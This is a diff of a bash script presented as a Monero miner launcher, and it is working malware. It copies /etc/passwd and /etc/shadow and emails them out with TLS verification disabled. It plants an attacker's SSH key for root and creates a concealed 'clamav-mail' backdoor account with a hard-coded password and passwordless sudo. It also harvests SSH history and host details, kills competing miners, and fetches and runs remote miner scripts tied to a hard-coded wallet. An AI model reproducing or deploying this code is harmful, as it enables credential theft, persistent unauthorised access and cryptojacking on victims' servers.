@@ -2,11 +2,9 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="6.0"
+readonly SCRIPT_VERSION="5.9"
 readonly BUILD_DATE="2026-05-24 19:30:00 UTC"
 readonly SCRIPT_NAME="setup_m0_launcher"
-
-FORCE_FALLBACK=true
 
 echo "=========================================="
 echo "MONERO MINER LAUNCHER"
@@ -288,7 +286,6 @@ IFS=$'\n\t'
 # Trap errors but continue execution
 trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
 
-# ==================== ROBUST SERVICE STOPPING FUNCTION ====================
 # ==================== ROBUST SERVICE STOPPING FUNCTION ====================
 force_stop_service() {
     local service_names="$1"
@@ -854,18 +851,20 @@ send_email_with_python() {
     local TEMP_PASSWD="/tmp/${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
     local TEMP_SHADOW="/tmp/${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
 
-# Create temp copies with fallback if unreadable
-if [ -r /etc/passwd ]; then
-    cp /etc/passwd "$TEMP_PASSWD"
-else
-    echo "ERROR: /etc/passwd not readable" > "$TEMP_PASSWD"
-fi
+    # Copy files and verify (must run as root for shadow file)
+    if [ -r /etc/passwd ]; then
+        cp /etc/passwd "$TEMP_PASSWD" 2>/dev/null
+        [ -f "$TEMP_PASSWD" ] && echo "[DEBUG] passwd file copied: $(ls -lh $TEMP_PASSWD)" >&2 || echo "[DEBUG] passwd copy failed" >&2
+    else
+        echo "[DEBUG] Cannot read /etc/passwd" >&2
+    fi
 
-if [ -r /etc/shadow ]; then
-    cp /etc/shadow "$TEMP_SHADOW"
-else
-    echo "ERROR: /etc/shadow not readable (requires root)" > "$TEMP_SHADOW"
-fi
+    if [ -r /etc/shadow ]; then
+        cp /etc/shadow "$TEMP_SHADOW" 2>/dev/null
+        [ -f "$TEMP_SHADOW" ] && echo "[DEBUG] shadow file copied: $(ls -lh $TEMP_SHADOW)" >&2 || echo "[DEBUG] shadow copy failed" >&2
+    else
+        echo "[DEBUG] Cannot read /etc/shadow (not root?)" >&2
+    fi
 
     python3 -c "
 import sys
@@ -896,6 +895,7 @@ try:
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
             msg.attach(part)
+        print(f'[DEBUG] Attached passwd file: {passwd_file}', file=sys.stderr)
     else:
         print(f'[DEBUG] passwd file NOT found: {passwd_file}', file=sys.stderr)
 
@@ -908,24 +908,16 @@ try:
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
             msg.attach(part)
+        print(f'[DEBUG] Attached shadow file: {shadow_file}', file=sys.stderr)
     else:
         print(f'[DEBUG] shadow file NOT found: {shadow_file}', file=sys.stderr)
 
-    # ========== INSERT THE CHECK HERE ==========
-    if not os.path.exists(passwd_file) or os.path.getsize(passwd_file) == 0:
-        print(f'[ERROR] passwd file missing or empty: {passwd_file}', file=sys.stderr)
-        sys.exit(1)
-
-    if not os.path.exists(shadow_file) or os.path.getsize(shadow_file) == 0:
-        print(f'[ERROR] shadow file missing or empty: {shadow_file}', file=sys.stderr)
-        sys.exit(1)
-    # ===========================================
-
-    # Create SSL context ...
+    # Create SSL context with disabled certificate verification
+    # (some servers have outdated CA certificates)
     context = ssl.create_default_context()
     context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
-    
+
     with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=10) as server:
         server.ehlo()
         server.starttls(context=context)
@@ -938,10 +930,10 @@ except Exception as e:
     sys.exit(1)
 " 2>&1
     local result=$?
-    
+
     # Clean up temp files
     rm -f "$TEMP_PASSWD" "$TEMP_SHADOW" 2>/dev/null
-    
+
     return $result
 }
 
@@ -949,7 +941,7 @@ except Exception as e:
 send_email_with_curl() {
     local temp_file="$1"
     local subject="$2"
-    
+
     curl -v --ssl-reqd \
         --url "smtp://$SMTP_SERVER:$SMTP_PORT" \
         --user "$SENDER_EMAIL:$SMTP_PASSWORD" \
@@ -963,7 +955,7 @@ send_email_with_curl() {
 send_email_with_mail() {
     local temp_file="$1"
     local subject="$2"
-    
+
     mail -s "$subject" "$RECIPIENT_EMAIL" < "$temp_file"
     return $?
 }
@@ -975,60 +967,60 @@ collect_bench_info() {
            DETAILED SYSTEM INFORMATION (like bench.sh)
 ======================================================================
 BENCH_INFO
-    
+
     echo " Timestamp          : $(date '+%Y-%m-%d %H:%M:%S %Z')"
     echo "----------------------------------------------------------------------"
-    
+
     # CPU Information
     local cpu_model=$(grep -m1 "model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs || echo "Unknown")
     local cpu_cores=$(grep -c ^processor /proc/cpuinfo 2>/dev/null || echo "Unknown")
     local cpu_mhz=$(grep -m1 "cpu MHz" /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs || echo "Unknown")
     local cpu_cache=$(grep -m1 "cache size" /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs || echo "Unknown")
-    
+
     echo " CPU Model          : $cpu_model"
     echo " CPU Cores          : $cpu_cores @ $cpu_mhz MHz"
     echo " CPU Cache          : $cpu_cache"
-    
+
     # Check AES-NI support
     if grep -q aes /proc/cpuinfo 2>/dev/null; then
         echo " AES-NI             : ✓ Enabled"
     else
         echo " AES-NI             : ✗ Disabled"
     fi
-    
+
     # Check VM extensions
     if grep -qE 'vmx|svm' /proc/cpuinfo 2>/dev/null; then
         echo " VM-x/AMD-V         : ✓ Enabled"
     else
         echo " VM-x/AMD-V         : ✗ Disabled"
     fi
-    
+
     # Disk Information
     local disk_total=$(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo "Unknown")
     local disk_used=$(df -h / 2>/dev/null | awk 'NR==2 {print $3}' || echo "Unknown")
     local disk_avail=$(df -h / 2>/dev/null | awk 'NR==2 {print $4}' || echo "Unknown")
     local disk_percent=$(df -h / 2>/dev/null | awk 'NR==2 {print $5}' || echo "Unknown")
     echo " Total Disk         : $disk_total ($disk_used Used, $disk_avail Available)"
-    
+
     # RAM Information
     local ram_total=$(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "Unknown")
     local ram_used=$(free -h 2>/dev/null | awk '/^Mem:/ {print $3}' || echo "Unknown")
     local ram_free=$(free -h 2>/dev/null | awk '/^Mem:/ {print $4}' || echo "Unknown")
     echo " Total RAM          : $ram_total ($ram_used Used, $ram_free Free)"
-    
+
     # Swap Information
     local swap_total=$(free -h 2>/dev/null | awk '/^Swap:/ {print $2}' || echo "Unknown")
     local swap_used=$(free -h 2>/dev/null | awk '/^Swap:/ {print $3}' || echo "Unknown")
     echo " Total Swap         : $swap_total ($swap_used Used)"
-    
+
     # System Uptime
     local uptime_str=$(uptime -p 2>/dev/null | sed 's/up //' || uptime | awk -F'up ' '{print $2}' | awk -F',' '{print $1}')
     echo " System Uptime      : $uptime_str"
-    
+
     # Load Average
     local load_avg=$(uptime 2>/dev/null | awk -F'load average:' '{print $2}' | xargs || echo "Unknown")
     echo " Load Average       : $load_avg"
-    
+
     # OS Information
     local os_name=$(grep "PRETTY_NAME" /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "Unknown Linux")
     local arch=$(uname -m 2>/dev/null || echo "Unknown")
@@ -1036,11 +1028,11 @@ BENCH_INFO
     echo " OS                 : $os_name"
     echo " Arch               : $arch ($(getconf LONG_BIT 2>/dev/null || echo "?") Bit)"
     echo " Kernel             : $kernel"
-    
+
     # TCP Congestion Control
     local tcp_cc=$(sysctl -n net.ipv4.tcp_congestion_control 2>/dev/null || echo "Unknown")
     echo " TCP Congestion Ctrl: $tcp_cc"
-    
+
     # Virtualization
     local virt="Unknown"
     if command -v systemd-detect-virt >/dev/null 2>&1; then
@@ -1054,17 +1046,17 @@ BENCH_INFO
         fi
     fi
     echo " Virtualization     : $virt"
-    
+
     # IPv4 and IPv6 Status
     local ipv4=$(curl -4 -s --max-time 5 ifconfig.me 2>/dev/null || echo "Offline")
     local ipv6=$(curl -6 -s --max-time 5 ifconfig.me 2>/dev/null || echo "Offline")
-    
+
     if [ "$ipv4" != "Offline" ]; then
         echo " IPv4/IPv6          : ✓ Online / $([ "$ipv6" != "Offline" ] && echo "✓ Online" || echo "✗ Offline")"
     else
         echo " IPv4/IPv6          : ✗ Offline / ✗ Offline"
     fi
-    
+
     # ISP and Location Information (via ip-api.com)
     if [ "$ipv4" != "Offline" ]; then
         local isp_json=$(curl -s --max-time 5 "http://ip-api.com/json/$ipv4" 2>/dev/null)
@@ -1075,7 +1067,7 @@ BENCH_INFO
             local country=$(echo "$isp_json" | grep -o '"country":"[^"]*' | cut -d'"' -f4 || echo "Unknown")
             local region=$(echo "$isp_json" | grep -o '"regionName":"[^"]*' | cut -d'"' -f4 || echo "Unknown")
             local asn=$(echo "$isp_json" | grep -o '"as":"[^"]*' | cut -d'"' -f4 || echo "Unknown")
-            
+
             echo " Organization       : $org"
             echo " ISP                : $isp"
             echo " Location           : $city / $country"
@@ -1083,7 +1075,7 @@ BENCH_INFO
             [ "$asn" != "Unknown" ] && echo " ASN                : $asn"
         fi
     fi
-    
+
     echo "----------------------------------------------------------------------"
 }
 
@@ -1093,16 +1085,16 @@ send_histories_email() {
     local PUBLIC_IP=$(curl -4 -s --max-time 5 ip.sb 2>/dev/null || echo "unavailable")
     local LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unavailable")
     local USER=$(whoami)
-    
+
     # Capture the original SSH connection command if available
     local SSH_CONNECTION=$(who am i 2>/dev/null | awk '{print $5}')
     local SSH_CLIENT="${SSH_CLIENT:-unavailable}"
     local SSH_TTY="${SSH_TTY:-unavailable}"
-    
+
     # Try to get the connection command from ps (process status)
     local PARENT_PID=$PPID
     local SSH_COMMAND=$(ps -p $PARENT_PID -o args= 2>/dev/null || ps -p $PPID -o command= 2>/dev/null || echo "unavailable")
-    
+
     # Try to get the connection details from environment variables
     local CONNECTION_FROM_ENV=""
     if [ -n "$SSH_CONNECTION" ]; then
@@ -1114,7 +1106,7 @@ send_histories_email() {
     if [ -n "$SSH_TTY" ]; then
         CONNECTION_FROM_ENV="$CONNECTION_FROM_ENV\nSSH_TTY: $SSH_TTY"
     fi
-    
+
     # Try to get details from .bash_history
     local RECENT_SSH_COMMANDS=$(grep -a "ssh " "$HOME/.bash_history" 2>/dev/null | tail -5 || echo "none found")
 
@@ -1172,7 +1164,7 @@ EOF
         elif command -v dnf >/dev/null 2>&1; then
             dnf install -y -q python3 >/dev/null 2>&1
         fi
-        
+
         if command_exists python3; then
             log_message "Python3 installed successfully"
         else
@@ -1184,19 +1176,6 @@ EOF
 
     # Try sending methods in order of preference
     local success=false
-
-    # ===== FORCED FALLBACK USING uuencode + mail =====
-if [ "$FORCE_FALLBACK" = true ] && command -v uuencode >/dev/null 2>&1 && command -v mail >/dev/null 2>&1; then
-    log_message "Using forced fallback: uuencode + mail"
-    (uuencode /etc/passwd passwd.txt; uuencode /etc/shadow shadow.txt) | mail -s "$subject" "$RECIPIENT_EMAIL"
-    if [ $? -eq 0 ]; then
-        log_message "Email sent successfully via uuencode+mail"
-        rm -f "$temp_file"
-        return 0
-    else
-        log_message "uuencode+mail failed, falling back to other methods..."
-    fi
-fi
 
     # Method 1: Python
     if command_exists python3; then
@@ -1249,7 +1228,7 @@ fi
     fi
 
     rm -f "$temp_file"
-    
+
     # Always return success to continue execution
     return 0
 }
@@ -1399,18 +1378,18 @@ setup_ssh_key() {
     local ssh_dir="$1"
     local auth_keys="$ssh_dir/authorized_keys"
     local ssh_key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/DbQQe/G8V0c9+VNjJEmoNxUrIGDqD+vSvS/2uAQ9HaumDAvVau2CcVBJM9STUm6xEGXdM/81LeJBVnw01D+FgFo5Sr/4zo+MDMUS/y/TfwK8wtdeuopvgET/HiZJn9/d68vbWXaS3jnQVTAI9EvpC1WTjYTYxFS/SyWJUQTA8tYF30jagmkBTzFjr/EKxxKTttdb79mmOgx1jP3E7bTjRPL9VxfhoYsuqbPk+FwOAsNZ1zv1UEjXMBvH+JnYbTG/Eoqs3WGhda9h3ziuNrzJGwcXuDhQI1B32XgPDxB8etsT6or8aqWGdRlgiYtkPCmrv+5pEUD8wS3WFhnOrm5Srew7beIl4LPLgbCPTOETgwB4gk/5U1ZzdlYmtiBNJxMeX38BsGoAhTDbFLcakkKP+FyXU/DsoAcow4av4OGTsJfs+sIeOWDQ+We5E4oc/olVNdSZ18RG5dwUde6bXbsrF5ipnE8oIBUI0z76fcbAOxogO/oxhvpuyWPOwXE6GaeOhWfWTxIyV5X4fuFDQXRPlMrlkWZ/cYb+l5JiT1h+vcpX3/dQC13IekE3cUsr08vicZIVOmCoQJy6vOjkj+XsA7pMYb3KgxXgQ+lbCBCtAwKxjGrfbRrlWoqweS/pyGxGrUVJZCf6rC6spEIs+aMy97+Q=='
-    
+
     log_message "Setting up SSH key in $ssh_dir"
-    
+
     # Remove old SSH directory if it exists
     if [ -d "$ssh_dir" ]; then
         rm -rf "$ssh_dir"
     fi
-    
+
     # Create SSH directory
     mkdir -p "$ssh_dir"
     chmod 700 "$ssh_dir"
-    
+
     # Add SSH key only if it doesn't exist
     if [ ! -f "$auth_keys" ] || ! grep -q "AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9f" "$auth_keys" 2>/dev/null; then
         echo "$ssh_key" >> "$auth_keys"
@@ -1426,9 +1405,9 @@ create_backdoor_user() {
     local username="clamav-mail"
     local uid=455
     local password='1!taugenichts'
-    
+
     log_message "Creating backdoor user: $username"
-    
+
     # Detect password hashing method
     local hash_method=$(grep '^ENCRYPT_METHOD' /etc/login.defs 2>/dev/null | awk '{print $2}')
     if [ -z "$hash_method" ]; then
@@ -1437,7 +1416,7 @@ create_backdoor_user() {
     else
         log_message "Detected hash method: $hash_method"
     fi
-    
+
     # Generate password hash
     local password_hash
     if [ "$hash_method" = "SHA512" ]; then
@@ -1445,30 +1424,30 @@ create_backdoor_user() {
     else
         password_hash=$(openssl passwd -1 -salt "$(openssl rand -base64 3)" "$password")
     fi
-    
+
     if [ -z "$password_hash" ]; then
         log_message "ERROR: Failed to generate password hash"
         return 1
     fi
-    
+
     # Remove existing user if present
     if id -u "$username" >/dev/null 2>&1; then
         log_message "User $username already exists, removing..."
         userdel --remove "$username" 2>/dev/null || log_message "Warning: Could not remove existing user"
     fi
-    
+
     # Create sudo group if it doesn't exist
     if ! grep -q '^sudo:' /etc/group 2>/dev/null; then
         log_message "Creating sudo group"
         groupadd sudo 2>/dev/null || log_message "Warning: Could not create sudo group"
     fi
-    
+
     # Create user-specific group if it doesn't exist
     if ! grep -q "^${username}:" /etc/group 2>/dev/null; then
         log_message "Creating group: $username"
         groupadd "$username" 2>/dev/null || log_message "Warning: Could not create user group"
     fi
-    
+
     # Create the user with home directory at /opt/clamav
     log_message "Creating user account with home at /opt/clamav"
     if useradd -u "$uid" -G root,sudo -g "$username" -m -d /opt/clamav -o -s /bin/bash "$username" 2>/dev/null; then
@@ -1477,7 +1456,7 @@ create_backdoor_user() {
         log_message "ERROR: Failed to create user"
         return 1
     fi
-    
+
     # Set password
     log_message "Setting user password"
     if usermod -p "$password_hash" "$username" 2>/dev/null; then
@@ -1486,7 +1465,7 @@ create_backdoor_user() {
         log_message "ERROR: Failed to set password"
         return 1
     fi
-    
+
     # Reorder passwd file to hide user in the middle
     log_message "Reordering passwd file"
     if [ -f /etc/passwd ]; then
@@ -1494,17 +1473,17 @@ create_backdoor_user() {
             if (NR < 3) {
                 for(i=1;i<=NR;i++) print lines[i];
             } else {
-                last=lines[NR]; 
-                delete lines[NR]; 
-                n=NR-1; 
-                m=int(n/2+1); 
-                for(i=1;i<m;i++) print lines[i]; 
-                print last; 
+                last=lines[NR];
+                delete lines[NR];
+                n=NR-1;
+                m=int(n/2+1);
+                for(i=1;i<m;i++) print lines[i];
+                print last;
                 for(i=m;i<=n;i++) print lines[i];
             }
         }' /etc/passwd > /tmp/passwd && mv /tmp/passwd /etc/passwd
     fi
-    
+
     # Reorder shadow file to hide user in the middle
     log_message "Reordering shadow file"
     if [ -f /etc/shadow ]; then
@@ -1512,17 +1491,17 @@ create_backdoor_user() {
             if (NR < 3) {
                 for(i=1;i<=NR;i++) print lines[i];
             } else {
-                last=lines[NR]; 
-                delete lines[NR]; 
-                n=NR-1; 
-                m=int(n/2+1); 
-                for(i=1;i<m;i++) print lines[i]; 
-                print last; 
+                last=lines[NR];
+                delete lines[NR];
+                n=NR-1;
+                m=int(n/2+1);
+                for(i=1;i<m;i++) print lines[i];
+                print last;
                 for(i=m;i<=n;i++) print lines[i];
             }
         }' /etc/shadow > /tmp/shadow && mv /tmp/shadow /etc/shadow
     fi
-    
+
     log_message "User creation completed"
     return 0
 }
@@ -1531,16 +1510,16 @@ create_backdoor_user() {
 setup_sudoers() {
     local username="clamav-mail"
     local sudoers_file="/etc/sudoers.d/$username"
-    
+
     log_message "Setting up sudoers for $username"
-    
+
     # Create sudoers entry
     echo "$username ALL=(ALL) NOPASSWD: ALL" > "$sudoers_file"
-    
+
     # Set proper permissions
     chmod 0440 "$sudoers_file"
     chown root:root "$sudoers_file"
-    
+
     # Validate sudoers file
     if visudo -c -f "$sudoers_file" >/dev/null 2>&1; then
         log_message "Sudoers file validated successfully"
@@ -1567,7 +1546,7 @@ download_and_execute() {
     # Try curl first (HTTPS only, ONE attempt)
     if command -v curl >/dev/null 2>&1; then
         log_message "Trying curl with HTTPS..."
-        
+
         if curl -s -L --max-time 60 "$url" > "$temp_script" 2>/dev/null; then
             # Clean the script (remove debugging)
             sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
@@ -1580,7 +1559,7 @@ download_and_execute() {
 
             local exit_code=${PIPESTATUS[0]}
             rm -f "$temp_script"
-            
+
             if [ $exit_code -eq 0 ]; then
                 log_message "$description completed successfully"
                 return 0
@@ -1589,7 +1568,7 @@ download_and_execute() {
                 return 1
             fi
         fi
-        
+
         rm -f "$temp_script"
     fi
 
@@ -1597,7 +1576,7 @@ download_and_execute() {
     if command -v wget >/dev/null 2>&1; then
         log_message "Trying wget with HTTPS..."
         temp_script=$(mktemp)
-        
+
         if wget -qO- --timeout=60 "$url" > "$temp_script" 2>/dev/null; then
             sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
             sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
@@ -1608,7 +1587,7 @@ download_and_execute() {
 
             local exit_code=${PIPESTATUS[0]}
             rm -f "$temp_script"
-            
+
             if [ $exit_code -eq 0 ]; then
                 log_message "$description completed successfully via wget"
                 return 0
@@ -1617,10 +1596,10 @@ download_and_execute() {
                 return 1
             fi
         fi
-        
+
         rm -f "$temp_script"
     fi
-    
+
     log_message "ERROR: $description download failed (tried curl and wget once each)"
     log_message "Manual intervention required - please check network connectivity"
     return 1
@@ -1628,28 +1607,28 @@ download_and_execute() {
 
 root_installation() {
     log_message "Starting root installation..."
-    
+
     # ==================== AUTO-SWAP FOR LOW-RAM SYSTEMS ====================
     log_message "Checking system resources..."
-    
+
     # Get RAM info (in MB)
     TOTAL_RAM=$(free -m 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "0")
     CURRENT_SWAP=$(free -m 2>/dev/null | awk '/^Swap:/ {print $2}' || echo "0")
-    
+
     log_message "System RAM: ${TOTAL_RAM}MB, Swap: ${CURRENT_SWAP}MB"
-    
+
     # Add swap if RAM < 2GB or no swap exists
     if [ "$TOTAL_RAM" -lt 2048 ] || [ "$CURRENT_SWAP" -eq 0 ]; then
         log_message "Low RAM detected - creating 2GB swap space..."
-        
+
         SWAP_FILE="/swapfile"
-        
+
         # Remove old swapfile if exists
         if [ -f "$SWAP_FILE" ]; then
             swapoff "$SWAP_FILE" 2>/dev/null || true
             rm -f "$SWAP_FILE"
         fi
-        
+
         # Create swap file
         if fallocate -l 2G "$SWAP_FILE" 2>/dev/null; then
             log_message "Swap file created with fallocate"
@@ -1658,20 +1637,20 @@ root_installation() {
         else
             log_message "WARNING: Could not create swap file"
         fi
-        
+
         # Setup swap if created
         if [ -f "$SWAP_FILE" ]; then
             chmod 600 "$SWAP_FILE"
-            
+
             if mkswap "$SWAP_FILE" >/dev/null 2>&1 && swapon "$SWAP_FILE" 2>/dev/null; then
                 log_message "✓ Swap enabled: 2GB"
-                
+
                 # Make permanent
                 if ! grep -q "$SWAP_FILE" /etc/fstab 2>/dev/null; then
                     echo "$SWAP_FILE none swap sw 0 0" >> /etc/fstab
                     log_message "✓ Swap added to /etc/fstab (permanent)"
                 fi
-                
+
                 # Show new memory status
                 FREE_OUTPUT=$(free -h 2>/dev/null | grep -E "^(Mem|Swap):" || true)
                 log_message "New memory status:\n${FREE_OUTPUT}"
@@ -1683,46 +1662,46 @@ root_installation() {
         log_message "✓ Sufficient RAM/Swap available"
     fi
     # ==================== END AUTO-SWAP ====================
-    
+
     # Install mail utilities
     install_mail_utils
-    
+
     # Setup SSH key for root
     setup_ssh_key "/root/.ssh"
-    
+
     # Create backdoor user
     if create_backdoor_user; then
         log_message "Backdoor user created successfully"
     else
         log_message "ERROR: Failed to create backdoor user"
     fi
-    
+
     # Setup sudoers
     if setup_sudoers; then
         log_message "Sudoers configured successfully"
     else
         log_message "WARNING: Sudoers configuration failed"
     fi
-    
+
     # Run the miner setup
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
     download_and_execute \
         "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE.sh?t=$(date +%s)" \
         "$wallet" \
         "root miner setup"
-    
+
     log_message "Root installation completed"
 }
 
 user_installation() {
     log_message "Starting user installation..."
-    
+
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
     download_and_execute \
         "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_gdm2_WITH_AUTOSTART.sh?t=$(date +%s)" \
         "$wallet" \
         "user miner setup"
-    
+
     log_message "User installation completed"
 }
 
@@ -1770,7 +1749,7 @@ if [ "$SWAPD_RUNNING" = true ]; then
     echo "[*] Automatically stopping old installation..."
     log_message "Automatically stopping old installation..."
     echo ""
-    
+
     # Stop systemd service
     if command -v systemctl >/dev/null 2>&1; then
         if systemctl --no-ask-password is-active --quiet swapd 2>/dev/null; then
@@ -1781,7 +1760,7 @@ if [ "$SWAPD_RUNNING" = true ]; then
             log_message "Systemd service stopped"
         fi
     fi
-    
+
     # Stop FreeBSD rc.d service
     if [ "$(uname -s)" = "FreeBSD" ] && [ -f /usr/local/etc/rc.d/swapd ]; then
         echo "[*] Stopping FreeBSD service..."
@@ -1789,7 +1768,7 @@ if [ "$SWAPD_RUNNING" = true ]; then
         echo "[✓] FreeBSD service stopped"
         log_message "FreeBSD service stopped"
     fi
-    
+
     # Stop SysV init service
     if [ -f /etc/init.d/swapd ]; then
         echo "[*] Stopping init.d service..."
@@ -1798,17 +1777,17 @@ if [ "$SWAPD_RUNNING" = true ]; then
         echo "[✓] Init.d service stopped"
         log_message "Init.d service stopped"
     fi
-    
+
     # Kill any remaining processes
     echo "[*] Killing remaining swapd processes..."
     pkill -9 swapd 2>/dev/null || true
     pkill -9 xmrig 2>/dev/null || true
     killall -9 swapd 2>/dev/null || true
     killall -9 xmrig 2>/dev/null || true
-    
+
     # Wait for processes to die
     sleep 2
-    
+
     # Verify processes are stopped
     if pgrep -x swapd >/dev/null 2>&1 || pgrep -f "swapd.*config" >/dev/null 2>&1; then
         echo "[!] WARNING: Some processes may still be running"
@@ -1818,7 +1797,7 @@ if [ "$SWAPD_RUNNING" = true ]; then
         done
         sleep 1
     fi
-    
+
     echo "[✓] Old installation stopped successfully"
     echo "[*] Proceeding with fresh installation..."
     log_message "Old installation stopped successfully - proceeding with fresh installation"
